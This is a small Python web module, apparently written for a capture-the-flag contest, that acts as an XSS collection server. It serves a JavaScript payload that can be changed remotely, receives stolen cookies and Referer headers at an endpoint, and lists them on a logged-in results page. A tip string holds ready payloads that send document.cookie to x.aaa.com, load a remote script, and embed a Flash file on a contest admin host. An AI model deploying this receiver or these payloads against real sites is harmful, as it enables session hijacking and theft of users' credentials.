# coding:utf-8

import json
import zlib
import base64
from view import route, url_for, View, LoginView, AjaxLoginView, AjaxView

xss_info = []

tip_text = '''
提示版：
        window.location='http://x.aaa.com/x?c=123'+document.cookie;
        <script src=http://x.aaa.com/xxs.js></script>
        <embed src="http://admin.web300b.alictf.com/d4.swf?img=http://x.aaa.com/x?c=ad" />
'''

js_txt = """alert(123);
//window.location='http://x.aaa.com/x?c=123'+document.cookie;
"""


@route('/a.js', name='the_xss_js')
class OneLine(View):
    def get(self):
        self.finish(js_txt)
    post = get


@route('/xss_js_set', name='j_xss_js_set')
class OneLine(AjaxView):
    def post(self):
        global js_txt
        txt = self.get_argument('js', '')
        js_txt = txt
        self.finish()


@route('/x', name='j_xss')
class OneLine(AjaxView):
    def get(self):
        #print(self.request.headers)
        txt = self.get_argument('c', '')
        print(txt)
        xss_info.append([self.request.headers.get("Referer"), txt])
        self.finish()

    post = get


@route('/xss/ret', name='xss_ret')
class OneLine(LoginView):
    def get(self):
        ret = ''
        for i in xss_info:
            ret += ("<li><p>referer: %s</p>%s</li>\n" % (i[0], i[1]))
        self.write(ret)
        self.finish()
